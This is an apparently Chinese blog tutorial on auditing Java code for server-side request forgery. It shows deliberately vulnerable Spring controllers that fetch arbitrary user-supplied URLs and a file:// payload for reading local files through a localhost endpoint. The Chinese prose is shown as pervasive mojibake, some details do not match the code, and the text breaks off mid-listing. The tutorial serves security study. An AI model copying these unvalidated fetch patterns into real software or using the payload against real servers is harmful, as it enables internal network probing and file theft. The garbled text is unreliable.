    <content type="html"><![CDATA[<h2 id="Javaä»£ç å®¡è®¡ä¸­çš„SSRF"><a href="#Javaä»£ç å®¡è®¡ä¸­çš„SSRF" class="headerlink" title="Javaä»£ç å®¡è®¡ä¸­çš„SSRF"></a>Javaä»£ç å®¡è®¡ä¸­çš„SSRF</h2><h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>SSRFçš„å½¢æˆå¤§å¤šæ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œé»‘å®¢æ“ä½œæœåŠ¡ç«¯ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ç­‰ï¼Œåˆ©ç”¨çš„æ˜¯æœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€ ã€‚SSRFåˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„Webåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>Javaçš„SSRFåˆ©ç”¨æ–¹å¼æ¯”è¾ƒå±€é™</p><ul><li>åˆ©ç”¨fileåè®®ä»»æ„æ–‡ä»¶è¯»å–ã€‚</li><li>åˆ©ç”¨httpåè®®ç«¯å£æ¢æµ‹</li></ul><h4 id="ç½‘ç»œè¯·æ±‚æ”¯æŒçš„åè®®"><a href="#ç½‘ç»œè¯·æ±‚æ”¯æŒçš„åè®®" class="headerlink" title="ç½‘ç»œè¯·æ±‚æ”¯æŒçš„åè®®"></a>ç½‘ç»œè¯·æ±‚æ”¯æŒçš„åè®®</h4><p>Javaç½‘ç»œè¯·æ±‚æ”¯æŒçš„åè®®å¯é€šè¿‡ä¸‹é¢å‡ ç§æ–¹æ³•æ£€æµ‹ï¼š</p><ul><li>ä»£ç ä¸­éå†åè®®</li><li>å®˜æ–¹æ–‡æ¡£ä¸­æŸ¥çœ‹</li><li><code>import sun.net.www.protocol</code>æŸ¥çœ‹</li></ul><p>ä»<code>import sun.net.www.protocol</code>å¯ä»¥çœ‹åˆ°ï¼Œæ”¯æŒä»¥ä¸‹åè®®</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span> <span class="hljs-keyword">ftp</span> mailto <span class="hljs-keyword">http</span> <span class="hljs-keyword">https</span> jar netdoc<br></code></pre></td></tr></table></figure><p><img src="/img/ssrf/ss01.png"></p><h4 id="å‘èµ·ç½‘ç»œè¯·æ±‚çš„ç±»"><a href="#å‘èµ·ç½‘ç»œè¯·æ±‚çš„ç±»" class="headerlink" title="å‘èµ·ç½‘ç»œè¯·æ±‚çš„ç±»"></a>å‘èµ·ç½‘ç»œè¯·æ±‚çš„ç±»</h4><p>å½“ç„¶ï¼ŒSSRFæ˜¯ç”±å‘èµ·ç½‘ç»œè¯·æ±‚çš„æ–¹æ³•é€ æˆã€‚æ‰€ä»¥å…ˆæ•´ç†Javaèƒ½å‘èµ·ç½‘ç»œè¯·æ±‚çš„ç±»ã€‚</p><ul><li>HttpClient</li><li>Request(å¯¹HttpClientå°è£…åçš„ç±»)</li><li>HttpURLConnection</li><li>URLConnection</li><li>URL</li><li>okhttp</li></ul><p>å¦‚æœå‘èµ·ç½‘ç»œè¯·æ±‚çš„ç±»æ˜¯å¸¦HTTPå¼€å¤´ï¼Œé‚£åªæ”¯æŒHTTPã€HTTPSåè®®ã€‚</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino">HttpURLConnection<br><span class="hljs-built_in">HttpClient</span><br>Request<br>okhttp<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œå¦‚æœç”¨ä»¥ä¸‹ç±»çš„æ–¹æ³•å‘èµ·è¯·æ±‚ï¼Œåˆ™æ”¯æŒ<code>sun.net.www.protocol</code>æ‰€æœ‰åè®®</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">URLConnection</span><br><span class="hljs-attribute">URL</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼ŒRequestç±»å¯¹HttpClientè¿›è¡Œäº†å°è£…ã€‚ç±»ä¼¼Pythonçš„requestsåº“ã€‚<br>ç”¨æ³•åŠå…¶ç®€å•ï¼Œä¸€è¡Œä»£ç å°±å¯ä»¥è·å–ç½‘é¡µå†…å®¹ã€‚</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-built_in">Request</span>.<span class="hljs-keyword">Get</span>(url).<span class="hljs-keyword">execute</span>().returnContent().<span class="hljs-keyword">to</span><span class="hljs-built_in">String</span>();<br></code></pre></td></tr></table></figure><h4 id="æ¼æ´ä»£ç "><a href="#æ¼æ´ä»£ç " class="headerlink" title="æ¼æ´ä»£ç "></a>æ¼æ´ä»£ç </h4><h5 id="SSRFä¸­çš„å†…ç½‘æ£€æµ‹"><a href="#SSRFä¸­çš„å†…ç½‘æ£€æµ‹" class="headerlink" title="SSRFä¸­çš„å†…ç½‘æ£€æµ‹"></a>SSRFä¸­çš„å†…ç½‘æ£€æµ‹</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.ssfr.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SsrfController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/ssrf&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">fetchUrl</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String url)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">html</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br>            <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">httpUrl</span> <span class="hljs-operator">=</span> (HttpURLConnection) u.openConnection();<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(httpUrl.getInputStream(), <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>            String line;<br>            <span class="hljs-keyword">while</span> ((line = base.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                html.append(line);<br>            &#125;<br>            base.close();<br>            <span class="hljs-keyword">return</span> html.toString();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;è¯·æ±‚å¤±è´¥&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ä»£ç ä¸­<code>HttpURLConnection httpUrl = (HttpURLConnection) urlConnection;</code>ï¼Œè¿™ä¸ªåœ°æ–¹è¿›è¡Œäº†å¼ºåˆ¶è½¬æ¢ï¼Œå»æŸåº¦æœç´¢äº†ä¸€ä¸‹å…·ä½“ç”¨æ„ã€‚å¾—å‡ºç»“è®ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">URLConnection:å¯ä»¥èµ°é‚®ä»¶ã€æ–‡ä»¶ä¼ è¾“åè®®ã€‚<br>HttpURLConnection åªèƒ½èµ°æµè§ˆå™¨çš„HTTPåè®®<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨äº†å¼ºè½¬ä¸ºHttpURLConnectionåï¼Œåˆ©ç”¨ä¸­åªèƒ½ä½¿ç”¨httpåè®®å»æ¢æµ‹è¯¥æœåŠ¡å™¨å†…ç½‘çš„å…¶ä»–åº”ç”¨ã€‚</p><p>ä½¿ç”¨ç™¾åº¦åšæµ‹è¯•</p><p><img src="/img/ssrf/ss02.png"></p><p>æ— æ³•è¯»å–æ–‡ä»¶ï¼Œå› ä¸ºè¿™é‡Œåªæ”¯æŒhttpå’Œhttpsçš„åè®®ã€‚</p><p><img src="/img/ssrf/ss03.png"></p><p>ä¸‹é¢æ¥è¯•è¯•ä¸å¼ºåˆ¶è½¬æ¢æˆHttpURLConnection</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/ssrfServlet&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handleRequest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String url)</span> &#123;<br>        String htmlContent;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">html</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);  <span class="hljs-comment">// å®ä¾‹åŒ–urlå¯¹è±¡</span><br>            <span class="hljs-type">URLConnection</span> <span class="hljs-variable">urlConnection</span> <span class="hljs-operator">=</span> u.openConnection();  <span class="hljs-comment">// æ‰“å¼€è¿æ¥</span><br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(urlConnection.getInputStream(), <span class="hljs-string">&quot;UTF-8&quot;</span>)<br>            );  <span class="hljs-comment">// è¯»å–èµ„æºå†…å®¹</span><br>            <span class="hljs-keyword">while</span> ((htmlContent = base.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                html.append(htmlContent);  <span class="hljs-comment">// æ‹¼æ¥å†…å®¹</span><br>            &#125;<br>            base.close();<br>            <span class="hljs-keyword">return</span> html.toString();  <span class="hljs-comment">// è¿”å›HTMLå†…å®¹</span><br>            <br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;è¯·æ±‚å¤±è´¥&quot;</span>;<br>        &#125;<br><br></code></pre></td></tr></table></figure><p>æ˜¯èƒ½å¤ŸæˆåŠŸè¯»å–æ–‡ä»¶çš„</p><p><img src="/img/ssrf/ss04.png"></p><h5 id="SSRFä¸­çš„è¯»å–æ–‡ä»¶"><a href="#SSRFä¸­çš„è¯»å–æ–‡ä»¶" class="headerlink" title="SSRFä¸­çš„è¯»å–æ–‡ä»¶"></a>SSRFä¸­çš„è¯»å–æ–‡ä»¶</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/readfileServlet&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String url, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url).openStream();<br>             <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream()) &#123;<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> len;<br>            <span class="hljs-keyword">while</span> ((len = inputStream.read(buffer)) &gt; <span class="hljs-number">0</span>) &#123;<br>                outputStream.write(buffer, <span class="hljs-number">0</span>, len);<br>            &#125;<br>            outputStream.flush();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            response.setStatus(<span class="hljs-number">500</span>); <span class="hljs-comment">// è®¾ç½®æœåŠ¡å™¨é”™è¯¯çŠ¶æ€</span><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>å’Œä¸Šé¢çš„ä»£ç å¯¹æ¯”ä¸€ä¸‹ï¼Œå‘ç°å…¶å®éƒ½å¤§è‡´ç›¸åŒï¼Œå”¯ä¸€ä¸åŒçš„åœ°æ–¹æ˜¯ä¸€ä¸ªæ˜¯ç”¨openStreamæ–¹æ³•è·å–å¯¹è±¡ï¼Œä¸€ä¸ªæ˜¯ç”¨openConnectionè·å–å¯¹è±¡ã€‚ä¸¤ä¸ªæ–¹æ³•ç±»ä¼¼</p><p><img src="/img/ssrf/ss05.png"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1:8080//downloadServlet?url=file:///C:%5c%5c1.txt<br></code></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼š</strong> è¿™é‡Œæ˜¯ä¸‰ä¸ªæ–œæ†ï¼Œå¹¶ä¸”åæ–œæ éœ€è¦urlç¼–ç  å¦åˆ™å°±ä¼šæŠ¥é”™</p><h5 id="SSRFä¸­çš„æ–‡ä»¶ä¸‹è½½"><a href="#SSRFä¸­çš„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="SSRFä¸­çš„æ–‡ä»¶ä¸‹è½½"></a>SSRFä¸­çš„æ–‡ä»¶ä¸‹è½½</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//æ–‡ä»¶ä¸‹è½½</span><br>    <span class="hljs-meta">@GetMapping(&quot;/download&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">downloadFile</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String url,</span><br><span class="hljs-params">                             HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1.txt&quot;</span>;<br>        response.setHeader(<span class="hljs-string">&quot;content-disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span> + filename);<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url).openStream();<br>             <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream()) &#123;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> len;<br>            <span class="hljs-keyword">while</span> ((len = inputStream.read(bytes)) &gt; <span class="hljs-number">0</span>) &#123;<br>                outputStream.write(bytes, <span class="hljs-number">0</span>, len);<br>            &#125;<br>        &#125;<br>    &#125;    <br></code></pre></td></tr></table></figure><p>ä¸è¯»å–æ–‡ä»¶ä¸åŒçš„æ˜¯å“åº”å¤´</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">response.setHeader(<span class="hljs-string">&quot;content-disposition&quot;</span>, <span class="hljs-string">&quot;attachment;fileName=&quot;</span> + filename);<br></code></pre></td></tr></table></figure><p>è®¾ç½®å“åº”å¤´ï¼Œå‘Šè¯‰æµè§ˆå™¨è¿™æ˜¯ä¸€ä¸ªé™„ä»¶ï¼Œä¸‹è½½æ—¶ä¿å­˜ä¸º <code>1.txt</code></p><p>è¿™æ®µä»£ç ï¼Œè®¾ç½®mimeç±»å‹ä¸ºæ–‡ä»¶ç±»å‹ï¼Œè®¿é—®æµè§ˆå™¨çš„æ—¶å€™å°±ä¼šè¢«ä¸‹è½½ä¸‹æ¥ã€‚</p><p>åŒæ ·å¯ä»¥ä½¿ç”¨fileåè®®ï¼Œèƒ½å¤ŸæˆåŠŸä¸‹è½½æ–‡ä»¶</p><p><img src="/img/ssrf/ss06.png"></p><h5 id="imageIOä¸­çš„SSRF"><a href="#imageIOä¸­çš„SSRF" class="headerlink" title="imageIOä¸­çš„SSRF"></a>imageIOä¸­çš„SSRF</h5><p>imageIOç±»æ˜¯jdkä¸­è‡ªå¸¦çš„ä¸€ä¸ªç±»ï¼Œä¸»è¦ç”¨äºæ“ä½œä¸€äº›å›¾ç‰‡æ–‡ä»¶ã€‚æ¯”å¦‚è¯»å†™ã€å‹ç¼©å›¾ç‰‡ã€‚</p><p>ssrf ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ssrf</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> BufferedImage <span class="hljs-title function_">read</span><span class="hljs-params">(URL url)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (url == <span class="hljs-literal">null</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;è¾“å…¥å†…å®¹ä¸ºç©º&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">InputStream</span>  <span class="hljs-variable">istream</span> <span class="hljs-operator">=</span> url.openStream();<br>        <span class="hljs-type">ImageInputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span>  ImageIO.createImageInputStream(istream);  <span class="hljs-comment">//è·å–æ–‡ä»¶</span><br>        <span class="hljs-type">BufferedImage</span> <span class="hljs-variable">bi</span> <span class="hljs-operator">=</span> ImageIO.read(stream);  <span class="hljs-comment">//è¿”å› BufferedImageä½œä¸ºä¾›ç»™çš„è§£ç ç»“æœ</span><br>        <span class="hljs-keyword">return</span> bi;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å›¾ç‰‡è¯»å–</span><br>    <span class="hljs-meta">@GetMapping(&quot;/httpclient&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">downloadImage</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String imageUrl,</span><br><span class="hljs-params">                              HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// è®¾ç½®å“åº”å†…å®¹ç±»å‹ä¸ºPNGå›¾ç‰‡</span><br>        response.setContentType(<span class="hljs-string">&quot;image/png&quot;</span>);<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>             <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream()) &#123;<br>            <span class="hljs-comment">// ä»URLè¯»å–å›¾ç‰‡</span><br>            <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(imageUrl);<br>            <span class="hljs-type">BufferedImage</span> <span class="hljs-variable">image</span> <span class="hljs-operator">=</span> ImageIO.read(url);<br>            <span class="hljs-keyword">if</span> (image != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">// å°†å›¾ç‰‡å†™å…¥å­—èŠ‚æ•°ç»„è¾“å‡ºæµ</span><br>                ImageIO.write(image, <span class="hljs-string">&quot;png&quot;</span>, os);<br>                <span class="hljs-comment">// å°†å­—èŠ‚æ•°ç»„å†™å…¥å“åº”è¾“å‡ºæµ</span><br>                <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(os.toByteArray())) &#123;<br>                    <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                    <span class="hljs-type">int</span> bytesRead;<br>                    <span class="hljs-keyword">while</span> ((bytesRead = input.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                        outputStream.write(buffer, <span class="hljs-number">0</span>, bytesRead);<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                response.sendError(HttpServletResponse.SC_NOT_FOUND, <span class="hljs-string">&quot;æ— æ³•ä»æŒ‡å®šURLè·å–å›¾ç‰‡&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, <span class="hljs-string">&quot;å›¾ç‰‡å¤„ç†å‡ºé”™&quot;</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡httpsåè®®è®¿é—®å›¾ç‰‡</p><p><img src="/img/ssrf/ss07.png"></p><p>å¯ä»¥é€šè¿‡fileåè®®è®¿é—®å›¾ç‰‡ï¼Œæ— æ³•è®¿é—®å…¶ä»–æ–‡ä»¶ã€‚åœ¨ç¨‹åºä¸­è®¾ç½®äº†æŠ›å‡ºå¼‚å¸¸ï¼Œè®¿é—®æ–‡ä»¶æ—¶ä¼šæœ‰erroræç¤º</p><p><img src="/img/ssrf/ss08.png"></p><p>è‹¥æœªè®¾ç½®æŠ›å‡ºå¼‚å¸¸ï¼Œèƒ½å¤Ÿçœ‹åˆ°æ–‡ä»¶æ˜¯å¦å­˜åœ¨</p><p>å¦‚ï¼š</p><p><img src="https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200917061817662-1567997288.png"></p><p><img src="https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200917061828967-1388285250.png"></p><p>å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨çš„è¯ä¼šæ˜¾ç¤ºæ‰¾ä¸åˆ°æŒ‡å®šæ–‡ä»¶ï¼Œè€Œå­˜åœ¨ä½†æ–‡ä»¶ä¸ä¸ºå›¾ç‰‡æ–‡ä»¶çš„è¯åˆ™æ˜¾ç¤ºimage&#x3D;&#x3D;nullã€‚</p><h5 id="HttpClientä¸‹çš„SSRF"><a href="#HttpClientä¸‹çš„SSRF" class="headerlink" title="HttpClientä¸‹çš„SSRF"></a>HttpClientä¸‹çš„SSRF</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">CloseableHttpClient</span> <span class="hljs-variable">httpClient</span> <span class="hljs-operator">=</span> HttpClients.createDefault();<br><span class="hljs-type">HttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpClient</span>();<br><span class="hljs-type">HttpGet</span> <span class="hljs-variable">getRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpGet</span>(url);<br><span class="hljs-type">HttpResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> httpClient.execute(getRequest);<br></code></pre></td></tr></table></figure><h5 id="OkHttp-ä¸‹çš„SSRF"><a href="#OkHttp-ä¸‹çš„SSRF" class="headerlink" title="OkHttp ä¸‹çš„SSRF"></a>OkHttp ä¸‹çš„SSRF</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>.Builder()<br>     .url(<span class="hljs-string">&quot;http://publicobject.com/helloworld.txt&quot;</span>)<br>     .build();<br><br> <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> client.newCall(request).execute();<br></code></pre></td></tr></table></figure><h4 id="ç™½ç›’è§„åˆ™"><a href="#ç™½ç›’è§„åˆ™" class="headerlink" title="ç™½ç›’è§„åˆ™"></a>ç™½ç›’è§„åˆ™</h4><p>ä¸Šé¢çš„æ¼æ´ä»£ç å¯æ€»ç»“ä¸º4ç§æƒ…å†µï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 